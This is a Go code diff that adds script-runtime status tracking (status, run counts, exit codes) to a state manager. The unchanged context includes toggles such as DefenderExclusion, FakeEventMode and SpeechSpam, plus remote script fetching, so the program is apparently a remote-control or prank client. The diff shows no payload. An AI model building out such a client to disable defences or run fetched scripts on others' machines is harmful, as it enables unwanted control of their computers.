@@ -9,6 +9,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 )
 
 type ScriptFile struct {
@@ -39,6 +40,17 @@ type ScriptConfig struct {
 	DelaySeconds int
 }
 
+type ScriptRuntimeState struct {
+	Status          string
+	Active          bool
+	LastStartedAt   time.Time
+	LastCompletedAt time.Time
+	LastExitCode    int
+	HasExitCode     bool
+	LastError       string
+	Runs            int64
+}
+
 type State struct {
 	DefenderExclusion bool
 	WindowsUpdate     bool
@@ -50,6 +62,7 @@ type State struct {
 	SoundPlayback     bool
 	SoundVolume       int
 	Script            ScriptConfig
+	ScriptRuntime     ScriptRuntimeState
 	FakeEventMode     string
 	SpeechSpam        bool
 	AutoMinimize      bool
@@ -83,6 +96,9 @@ func NewManager(opts ManagerOptions) *Manager {
 			SoundVolume:       60,
 			Script: ScriptConfig{
 				Mode: "Instant",
+			},
+			ScriptRuntime: ScriptRuntimeState{
+				Status: "idle",
 			},
 			FakeEventMode: "None",
 		},
@@ -153,6 +169,15 @@ func (m *Manager) Snapshot() State {
 	m.mu.RLock()
 	defer m.mu.RUnlock()
 	return m.state
+}
+
+func (m *Manager) SetScriptRuntime(state ScriptRuntimeState) {
+	if m == nil {
+		return
+	}
+	m.mu.Lock()
+	m.state.ScriptRuntime = state
+	m.mu.Unlock()
 }
 
 func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metadata map[string]any, fetcher ScriptFetcher) (string, error) {
@@ -463,6 +488,7 @@ func (m *Manager) ApplyOperation(ctx context.Context, rawOperation string, metad
 			Path:     storedPath,
 			Checksum: finalChecksum,
 		}
+		m.state.ScriptRuntime = ScriptRuntimeState{Status: "staged"}
 		m.mu.Unlock()
 
 		if hasToken && previousPath != "" && previousPath != storedPath {
